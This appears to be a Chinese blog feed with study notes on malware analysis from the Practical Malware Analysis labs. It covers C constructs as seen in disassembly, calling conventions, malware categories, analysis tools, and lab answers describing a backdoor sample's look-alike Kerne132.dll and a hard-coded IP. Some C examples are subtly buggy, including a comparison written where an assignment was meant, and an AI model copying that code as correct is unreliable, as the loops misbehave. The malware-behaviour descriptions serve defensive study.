    <content type="html"><![CDATA[<p>C语言是最基础的高级编程语言，许多恶意代码都是有C编写的<br><a id="more"></a></p><h1 id="识别汇编中的C代码结构"><a href="#识别汇编中的C代码结构" class="headerlink" title="识别汇编中的C代码结构"></a>识别汇编中的C代码结构</h1><h2 id="全局与局部变量"><a href="#全局与局部变量" class="headerlink" title="全局与局部变量"></a>全局与局部变量</h2><p>全局变量可以被一个程序中的任意函数访问和使用，局部变量只能在它被定义的函数中访问和使用。例如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdio.h&gt;</div><div class="line">int x=1, y=3;</div><div class="line">void main()</div><div class="line">&#123;</div><div class="line">x = x + y;</div><div class="line">printf(&quot;Total = %d\n&quot;,x);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>与<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdio.h&gt;</div><div class="line">void main()</div><div class="line">&#123;</div><div class="line">int x = 1, y = 3;</div><div class="line">x = x + y;</div><div class="line">printf(&quot;Total = %d\n&quot;,x);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>汇编结构:<br><img src="https://i.imgur.com/YA5gXPl.png" alt=""><br>全局变量通过内存地址引用，而局部变量通过栈地址引用.</p><h2 id="各种结构体"><a href="#各种结构体" class="headerlink" title="各种结构体"></a>各种结构体</h2><h3 id="if-else"><a href="#if-else" class="headerlink" title="if-else"></a>if-else</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> x = <span class="number">1</span>, y = <span class="number">3</span>,x1=<span class="number">0</span>,y1=<span class="number">2</span>;</div><div class="line"><span class="keyword">if</span> (x==y) &#123;</div><div class="line"><span class="keyword">if</span>(y1==x1)&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"y == x\n and y1==x1\n"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"y == x and y1!=x1\n"</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line"><span class="keyword">if</span> (y1==x1) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"y1== x1 and x!=y\n"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"y1!= x1 and  x!=y\n"</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>汇编窗口<br><img src="https://i.imgur.com/d7WvAra.png" alt=""><br>视图<br><img src="https://i.imgur.com/Asu0roV.png" alt=""><br>逻辑是一样的，判断后跳转</p><h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line"><span class="keyword">switch</span> (i) </div><div class="line">&#123;</div><div class="line"><span class="keyword">case</span> <span class="number">1</span>: </div><div class="line"><span class="built_in">printf</span>(<span class="string">"i == 1"</span>);</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> <span class="number">2</span>:</div><div class="line"><span class="built_in">printf</span>(<span class="string">"i == 2"</span>);</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> <span class="number">3</span>:</div><div class="line"><span class="built_in">printf</span>(<span class="string">"i == 3"</span>);</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>汇编窗口<br><img src="https://i.imgur.com/eMvkfsC.png" alt=""><br>视图<br><img src="https://i.imgur.com/ziZzHE1.png" alt=""></p><h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> i;</div><div class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"i equals %d\n"</span>,i);</div><div class="line">&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>汇编窗口<br><img src="https://i.imgur.com/m5UeIjS.png" alt=""></p><h3 id="while"><a href="#while" class="headerlink" title="while"></a>while</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line"><span class="keyword">while</span>(i&gt;<span class="number">10</span>)&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"i equals %d\n"</span>,i);</div><div class="line">i++;</div><div class="line">&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>汇编窗口<br><img src="https://i.imgur.com/FHPnkmN.png" alt=""></p><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="keyword">int</span> b[<span class="number">5</span>] = &#123;<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line"><span class="keyword">int</span> a[<span class="number">5</span>];</div><div class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</div><div class="line">&#123;</div><div class="line">a[i] = i;</div><div class="line">b[i] = i;</div><div class="line">&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>汇编窗口<br><img src="https://i.imgur.com/3YdJPOu.png" alt=""><br>视图</p><h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">my_struct</span> &#123;</span></div><div class="line"><span class="keyword">int</span> x[<span class="number">5</span>];</div><div class="line"><span class="keyword">char</span> y;</div><div class="line"><span class="keyword">double</span> z;</div><div class="line">&#125;;</div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">my_struct</span> *<span class="title">gms</span>;</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(struct my_struct *q)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> i;</div><div class="line">q-&gt;y = <span class="string">'a'</span>;</div><div class="line">q-&gt;z = <span class="number">15.6</span>;</div><div class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</div><div class="line">&#123;</div><div class="line">q-&gt;x[i] = i;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">gms = (struct my_struct *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct my_struct));</div><div class="line">test(gms);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>汇编窗口<br><img src="https://i.imgur.com/8L4rj5o.png" alt=""></p><h3 id="遍历列表"><a href="#遍历列表" class="headerlink" title="遍历列表"></a>遍历列表</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></div><div class="line"><span class="keyword">int</span> x;</div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></div><div class="line">&#125;;</div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">pnode</span>;</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">pnode *curr, *head;</div><div class="line"><span class="keyword">int</span> i;</div><div class="line">head = <span class="literal">NULL</span>;</div><div class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">10</span>;i++)</div><div class="line">&#123;</div><div class="line">curr = (pnode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(pnode));</div><div class="line">curr-&gt;x = i;</div><div class="line">curr-&gt;next = head;</div><div class="line">head = curr;</div><div class="line">&#125;</div><div class="line">curr = head;</div><div class="line"><span class="keyword">while</span> (curr)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,curr-&gt;x);</div><div class="line">curr == curr-&gt;next;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>汇编窗口<br><img src="https://i.imgur.com/cTZFWiI.png" alt=""></p><h2 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h2><h3 id="cdecl"><a href="#cdecl" class="headerlink" title="cdecl"></a>cdecl</h3><p>C语言默认的函数调用方法：所有参数从右到左依次入栈，这些参数由调用者清除，称为手动清栈。</p><h3 id="stdcall"><a href="#stdcall" class="headerlink" title="stdcall"></a>stdcall</h3><p> 调用约定用于调用 Win32 API 函数。其参数都是从右向左通过堆栈传递的, 被调用方将清理堆栈</p><h3 id="fastcall"><a href="#fastcall" class="headerlink" title="fastcall"></a>fastcall</h3><p>规定将前两个参数由寄存器ecx和edx来传递(x86)，其余参数还是通过堆栈传递（从右到左）。函数调用结束后由被调用函数清除栈内数据</p><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><h3 id="lab06-01"><a href="#lab06-01" class="headerlink" title="lab06-01"></a>lab06-01</h3><p>1、由main函数调用的唯一子过程中发现的主要代码结构是什么?<br>有一个if-else结构体<br>2、位于0x40105f的子过程是什么？<br>一个结构体，输出函数<br>3、这个程序的目的是什么？<br>判断网络连接状态</p><h3 id="lab06-2"><a href="#lab06-2" class="headerlink" title="lab06-2"></a>lab06-2</h3><p>1、main函数调用的第一个子过程执行什么操作？<br>判断网络连接状态<br>2、位于0x40117F的子过程是什么？<br>一个结构体，输出函数<br>3、被main函数调用的第二个子过程做了什么？<br><img src="https://i.imgur.com/gtfKGxY.png" alt=""><br>一个连接网络的函数<br>4、在这个子过程中使用了什么类型的代码结构？<br>使用了if-else和结构体<br>5、在这个子过程中使用了什么类型的代码结构？<br>指定连接这个域名 <a href="http://www.practicalmalwareanalysis.com" target="_blank" rel="external">http://www.practicalmalwareanalysis.com</a><br>6、这个恶意代码的目的是什么？<br>判断是否有网络并且连接这个域名 <a href="http://www.practicalmalwareanalysis.com" target="_blank" rel="external">http://www.practicalmalwareanalysis.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;C语言是最基础的高级编程语言，许多恶意代码都是有C编写的&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>恶意代码分析——静态与动态分析基础技术</title>
    <link href="http://yoursite.com/2018/03/29/re_evil_1/"/>
    <id>http://yoursite.com/2018/03/29/re_evil_1/</id>
    <published>2018-03-29T00:22:44.061Z</published>
    <updated>2018-04-03T23:57:19.118Z</updated>
    
    <content type="html"><![CDATA[<p>啥？你电脑中病毒啦，被勒索啦，那就来好好学习恶意代码分析，讲得很好。留下了没有技术的眼泪<br><a id="more"></a></p><h1 id="恶意代码"><a href="#恶意代码" class="headerlink" title="恶意代码"></a>恶意代码</h1><h2 id="什么是恶意代码分析"><a href="#什么是恶意代码分析" class="headerlink" title="什么是恶意代码分析"></a>什么是恶意代码分析</h2><p>恶意代码也称为恶意软件:任何以某种方式来对用户、计算机或者网络炒成破坏的软件，包括计算机病毒、木马、蠕虫、内核套件、勒索软件、间谍软件；</p><h2 id="各种鸡汤"><a href="#各种鸡汤" class="headerlink" title="各种鸡汤"></a>各种鸡汤</h2><p>不管你是否有恶意代码分析的背景或经验，你都会从本书中受益。若你将要被安全公司炒，那么你马上拿起这本书啃，这将会帮助你保住饭碗。若你还是对恶意软件一无所知，那么你会将开启一闪全新的大门。。鸡汤再多，还是要动手实践，实践是检测能力的唯一标准。</p><h2 id="恶意代码类型"><a href="#恶意代码类型" class="headerlink" title="恶意代码类型"></a>恶意代码类型</h2><p>1、后门: 恶意代码将自身安装到一台计算机来 允许攻击者来访问。后门程序通常让攻击者只需很少认证甚至无需认证，便可连接到 远程计算机上，并可以在本地系统执行命令。<br>2、僵尸网络：与后门类似，也允许攻击者访问系统。但是所有被同一个僵尸网络感染的计算机将会从一台控制命令服务器收到相同的命令<br>3、下载器:这是一类只是用来下载其他恶意代码的恶意代码。下载器通常是在攻击者获得系统的访问时，首先进行安装的。下载程序会下载和安装其他的恶意代码。<br>4、间谍软件:这是一类从受害计算机上收集信息并发送给攻击者的恶意代码。比如:键盘记录器<br>5、启动器: 用来启动其他恶意程序的恶意软件。一般使用一些非传统的技术，以确保其隐蔽性，或者以获取高权限访问系统。<br>6、内核套件: 设计用来隐藏其他恶意代码的恶意软件。通常与其他恶意代码(后门)组合成工具套装。<br>7、勒索软件:通过骚扰、恐吓甚至采用绑架用户文件等方式，使用户数据资产或计算资源无法正常使用，并以此为条件向用户勒索钱财。这类用户数据资产包括文档、邮件、数据库、源代码、图片、压缩文件等多种文件。赎金形式包括真实货币、比特币或其它虚拟货币。<br>8、发送垃圾邮件的恶意代码:这类恶意代码在感染用户计算机之后，便会使用系统与网络资源来发送大量的垃圾邮件。<br>9、蠕虫或计算机病毒:可以自我复制和感染其他计算机的恶意代码。</p><h1 id="静态分析基础技术"><a href="#静态分析基础技术" class="headerlink" title="静态分析基础技术"></a>静态分析基础技术</h1><h2 id="反病毒引擎扫描-实用的第一步"><a href="#反病毒引擎扫描-实用的第一步" class="headerlink" title="反病毒引擎扫描:实用的第一步"></a>反病毒引擎扫描:实用的第一步</h2><p>当分析一个可疑的代码样本时，第一步就最好是拿多个反病毒软件扫描下这个文件，看是否有哪个引擎已经能够识别它。因为反病毒软件主要依靠一个已知的恶意代码可识别片段的特征数据库(病毒文件特征库)，以及基于行为与模式匹配的分析(启发式检测)。而攻击者可以轻易的修改自己的代码。这时，对同一个可疑恶意代码样本，运行多个不同的反病毒软件进行扫描检测 是相当有必要的，类似VirusTotal(<a href="http://www.virustotal.com/" target="_blank" rel="external">http://www.virustotal.com/</a>)</p><h2 id="哈希值-恶意代码的指纹"><a href="#哈希值-恶意代码的指纹" class="headerlink" title="哈希值:恶意代码的指纹"></a>哈希值:恶意代码的指纹</h2><p>哈希是一种用来唯一标识恶意代码的常用方法。恶意代码样本通过一个哈希程序，会产生出一段用于唯一标识这个样本的独特哈希值(类似一种指纹)<br>MD5算法是恶意代码分析最为常用的一种哈希函数，SHA算法也同样流行。<br>如:使用md5deep程序来计算Windows操作系统自带的Solitaire程序哈希值,然后在线查找搜索这段哈希值，看看这个文件是否被识别：<br><img src="https://i.imgur.com/bEqXNCU.png" alt=""><br>图形化界面WinMD5计算器，可以同时计算和显示出多个文件的哈希值。<br><img src="https://i.imgur.com/IK6PVpj.png" alt=""><br>一旦你对一个恶意样本拥有一个哈希值之后，你可以把它做如下用途:<br>将哈希值作为标签使用<br>与其他分析师分享哈希值，以帮助他们来识别恶意代码<br>在线搜索这段 哈希值，看看这个文件是否被识</p><h2 id="查找字符串"><a href="#查找字符串" class="headerlink" title="查找字符串"></a>查找字符串</h2><p>一个程序会包含一些字符串，比如打印出的消息，连接的URL,或者复制文到某个特定的位置。从字符串中进行搜索是获取程序功能提示的一种简单方法 。比如程序访问一个URL，访问的URL就是存储为程序中的一个字符串。可以使用String程序(<a href="http://technet.microsoft.com/enus/sysinternals/bb897439)来搜索可执行文件中可打印的字符串。" target="_blank" rel="external">http://technet.microsoft.com/enus/sysinternals/bb897439)来搜索可执行文件中可打印的字符串。</a><br>而一般在可执行文件中是以ACSII码和Unicode(这里指的是微软的)存储的，如下<br><img src="https://i.imgur.com/usLtFRz.png" alt=""><br>查找结果<br><img src="https://i.imgur.com/qLjIY8G.png" alt=""></p><h2 id="加壳与混淆恶意代码"><a href="#加壳与混淆恶意代码" class="headerlink" title="加壳与混淆恶意代码"></a>加壳与混淆恶意代码</h2><p>恶意代码编写者经常使用加壳或混淆技术，让程序更难被检测或分析。混淆程序是恶意代码编写者尝试去隐藏其执行过程的代码。而加壳程序则是混淆程序的一类，加壳后的恶意程序一般会被压缩，并且难以分析。<br>合法程序大多总是会包含很多字符串，而由被加壳或混淆的恶意代码直接分析获得的字符串很少(一般包含LoadLibrary和GetProcAddress函数，他们是用来加载和使用其他函数功能的)。</p><h2 id="文件加壳"><a href="#文件加壳" class="headerlink" title="文件加壳"></a>文件加壳</h2><p>当加壳文件的程序运行时，会先进行一小段的脱壳代码，来解压缩加壳的文件，然后在运行脱壳后的文件，如下图。<br><img src="https://i.imgur.com/Xe453HQ.png" alt=""><br>当对一个加壳程序进行静态分析时，只有这一小段代码可以被解析。</p><h3 id="使用PEID-或exeinfoPE-检测加壳"><a href="#使用PEID-或exeinfoPE-检测加壳" class="headerlink" title="使用PEID(或exeinfoPE)检测加壳"></a>使用PEID(或exeinfoPE)检测加壳</h3><h2 id="PE的文件结构"><a href="#PE的文件结构" class="headerlink" title="PE的文件结构"></a>PE的文件结构</h2><p>我前面有写<br><a href="https://esebanana.github.io/2018/03/21/re_PE/" target="_blank" rel="external">https://esebanana.github.io/2018/03/21/re_PE/</a></p><h2 id="链接库与函数"><a href="#链接库与函数" class="headerlink" title="链接库与函数"></a>链接库与函数</h2><p>对于一个可执行文件，我们可以收集到最有用的信息之一，就是它的导入表。导入表函数是一个程序所使用的函数，但存储在其他程序中的那些函数。链接分为:静态链接，运行时链接与动态链接</p><h3 id="静态链接，运行时链接与动态链接"><a href="#静态链接，运行时链接与动态链接" class="headerlink" title="静态链接，运行时链接与动态链接"></a>静态链接，运行时链接与动态链接</h3><pre><code>静态链接是Windows平台链接代码库最不常用的方法，当一个库被静态链接到可执行文件时，所有这个库中的代码都会被复制到可执行文件中。这会让执行程序大很多。运行时链接在合法程序中并不流行，但是在恶意代码中是常用的，特别是当恶意代码被加壳或是混淆的时候。使用运行时链接的可执行程序，只有当需要使用函数时，才链接到库，而不是想动态链接模式那样在程序启动时就会链接。动态链接是windows里最常用的，将一些函数打包在一个dll里，然后通过程序调用dll里的函数，在程序启动时就会链接上。</code></pre><h3 id="使用Dependency-Walker工具探索动态链接函数"><a href="#使用Dependency-Walker工具探索动态链接函数" class="headerlink" title="使用Dependency Walker工具探索动态链接函数"></a>使用Dependency Walker工具探索动态链接函数</h3><p>界面<br><img src="https://i.imgur.com/GPksbSz.png" alt=""><br>常见的dll<br><img src="https://i.imgur.com/l6sqRh6.png" alt=""></p><h2 id="静态分析技术实践"><a href="#静态分析技术实践" class="headerlink" title="静态分析技术实践"></a>静态分析技术实践</h2><p>学习样本:(<a href="http://www.practicalmalwareanalysis.com)或(http://www.nostarch.com/malware.htm" target="_blank" rel="external">http://www.practicalmalwareanalysis.com)或(http://www.nostarch.com/malware.htm</a>)</p><h3 id="反病毒引擎扫描"><a href="#反病毒引擎扫描" class="headerlink" title="反病毒引擎扫描"></a>反病毒引擎扫描</h3><p>将Lab01-01.exe和Lab01-01.dll放到<a href="https://www.virustotal.com结果如下(我是翻墙的)：" target="_blank" rel="external">https://www.virustotal.com结果如下(我是翻墙的)：</a><br><img src="https://i.imgur.com/0oxKOCq.png" alt=""><br><img src="https://i.imgur.com/9q5Cwxd.png" alt=""></p><h3 id="什么时候编译的"><a href="#什么时候编译的" class="headerlink" title="什么时候编译的"></a>什么时候编译的</h3><p><img src="https://i.imgur.com/2fCf4JN.png" alt=""></p><h3 id="是否被混淆或者加壳"><a href="#是否被混淆或者加壳" class="headerlink" title="是否被混淆或者加壳"></a>是否被混淆或者加壳</h3><p><img src="https://i.imgur.com/6l4SNrb.png" alt=""><br>发现并没有加壳，但是用Dependency Walker查看发现并没有很多函数，可能被混淆啦。接着用strings 查看dll,发现一个ip地址<br><img src="https://i.imgur.com/tY54N4S.png" alt=""></p><h3 id="是否导入函数，是做什么的"><a href="#是否导入函数，是做什么的" class="headerlink" title="是否导入函数，是做什么的"></a>是否导入函数，是做什么的</h3><p>发现有两个重要的结果<br>1.点用到内核函数库Kernel32.dll函数库中的几个重要的函数，CreateProcessA，Sleep.<br>2.调用MSVCRT.dll多线程库，调用网络链接库，外加上一个IP地址，猜测用到http服务</p><h3 id="是否有任何其它文件或基于主机的迹象"><a href="#是否有任何其它文件或基于主机的迹象" class="headerlink" title="是否有任何其它文件或基于主机的迹象"></a>是否有任何其它文件或基于主机的迹象</h3><p>用PEview打开<br><img src="https://i.imgur.com/lyOtUHh.png" alt=""><br>首先是两个近似函数Kernel32.dll  与Kerne132.dll，初步判断是进行文件混淆目的。<br>然后是一个系统目录路径，一个函数Kerne132.dll，初步判断是这个路径和Kerne132.dll存在某种关联。<br>然后再来两个Kernel32.dll 和Lab01-01.dll，Lab01-01.dll这很明显就是上面分析的.dll文件，所以初步判定是这个程序需要调用到Kernel32.dll 和Lab01-01.dll。<br>然后是系统路径和Kernel32.dll文件，和一个函数。这就是说调用到系统路径里的Kernel32.dll文件的某个函数<br>众多联系起来可以进一步判断，这个程序实现的功能是在系统路径中寻找，创建，复制一个Kerne132.dll文件，然后还调用了Lab01-01.dll文件实现它里面的功能。</p><h3 id="是否有基于网络的迹象"><a href="#是否有基于网络的迹象" class="headerlink" title="是否有基于网络的迹象"></a>是否有基于网络的迹象</h3><p>有基于网络的迹象，发现IP：127.26.152.13</p><h3 id="文件的目的是什么"><a href="#文件的目的是什么" class="headerlink" title="文件的目的是什么"></a>文件的目的是什么</h3><p>该文件并没有加壳，她住要实现的功能是，调用Kernel32.dll文件的相关函数，实现在系统目录里面遍历查找是否存在Kerne132.dll文件，如果不存在就进行创建Kerne132.dll文件，进行混淆Kernel32.dll文件，然后再调用Lab01-01.dll文件，实现通过联通网络，然后接受目标IP：127.26.152.13传过来的指令，通过该文件后门向系统发出休眠指令使得系统进入休眠状态。</p><h1 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h1><p>动态分析就是在运行恶意代码之后进行检查的过程。动态分析技术是恶意代码分析流程的第二步，一般在静态分析基础技术进入一个困难的时候。，动态分析能让你观察到恶意代码的真实功能，一个行为存在二进制程序中，并不意味着他就会执行，动态分析也是一种识别恶意代码功能的有效方法。虽然动态分析技术分成好用，但它还是应该在静态分析基础技术之后进行。</p><h2 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h2><h3 id="简便但粗糙的方法"><a href="#简便但粗糙的方法" class="headerlink" title="简便但粗糙的方法"></a>简便但粗糙的方法</h3><p>有几个功能一体化的软件产品，可以用来进行基本的动态分析，最流行的就是沙箱技术，沙箱是一种在安全环境里运行不信任程序的安全机制，不用担心伤害到”真正的”系统。沙箱包含一个虚拟环境，通过某种方式模拟网络服务，以确保被测试的软件或恶意代码能正常执行。</p><h3 id="使用恶意代码沙箱"><a href="#使用恶意代码沙箱" class="headerlink" title="使用恶意代码沙箱"></a>使用恶意代码沙箱</h3><p>许多分析容易的代码的沙箱，诸如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Norman沙箱，GFI沙箱，Anubis,Joe沙箱、ThreatExpert\BitBlaze和Comodo</div></pre></td></tr></table></figure></p><p>恶意代码分析，等等，都是提供免费分析恶意代码服务。Norman沙箱，GFI沙箱是最受欢迎的。这些沙箱都提供容易理解的输出结果，而且用来做初诊断非常有用，而且这些沙箱都是自动执行的。</p><h2 id="rundll32-exe"><a href="#rundll32-exe" class="headerlink" title="rundll32.exe"></a>rundll32.exe</h2><p>所有windows版本中都包含rundll32.exe程序，它提供了一个运行DLL的平台<br>语法：C:\rundll32.exe DLLname,Export arguments</p><h2 id="Process-Monitor"><a href="#Process-Monitor" class="headerlink" title="Process Monitor"></a>Process Monitor</h2><p>进程监视器，它提供一种方式来监控注册表，文件系统，网络，进程和线程行为，结合并增强了FileMon和RegMon的功能</p><h2 id="Process-Explorer"><a href="#Process-Explorer" class="headerlink" title="Process Explorer"></a>Process Explorer</h2><p>进程浏览器，用来列出所有活跃的进程，被进程载入的DLL，各种进程属性和整体系统信息，也可以用它杀死一个进程，退出用户登录，启动与激活进程</p><h2 id="Dependency-Walker"><a href="#Dependency-Walker" class="headerlink" title="Dependency Walker"></a>Dependency Walker</h2><p>支持列出可执行文件的动态链接</p><h2 id="Regshot"><a href="#Regshot" class="headerlink" title="Regshot"></a>Regshot</h2><p>注册表比较工具，可以比较两个注册表的快照，发现差异</p><h2 id="ApateDNS"><a href="#ApateDNS" class="headerlink" title="ApateDNS"></a>ApateDNS</h2><p>用来查看恶意代码发出的DNS请求</p><h2 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h2><p>被用在支持端口扫描，隧道，代理，端口转发等对内外连接上</p><h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><p>嗅探器，截获并记录网络数据包的工具</p><h2 id="INetSim"><a href="#INetSim" class="headerlink" title="INetSim"></a>INetSim</h2><p>基于linux模拟常见网络服务的免费软件，通过模拟服务（HTTP，HTTPS，FTP，IRC，DNS，SMTP等），允许你来分析未知恶意代码的网络行为</p><h2 id="动态分析技术实践"><a href="#动态分析技术实践" class="headerlink" title="动态分析技术实践"></a>动态分析技术实践</h2><h3 id="lab3-1"><a href="#lab3-1" class="headerlink" title="lab3-1"></a>lab3-1</h3><h4 id="找出这个恶意代码的导入函数与字符串列表"><a href="#找出这个恶意代码的导入函数与字符串列表" class="headerlink" title="找出这个恶意代码的导入函数与字符串列表"></a>找出这个恶意代码的导入函数与字符串列表</h4><p>用Dependecy 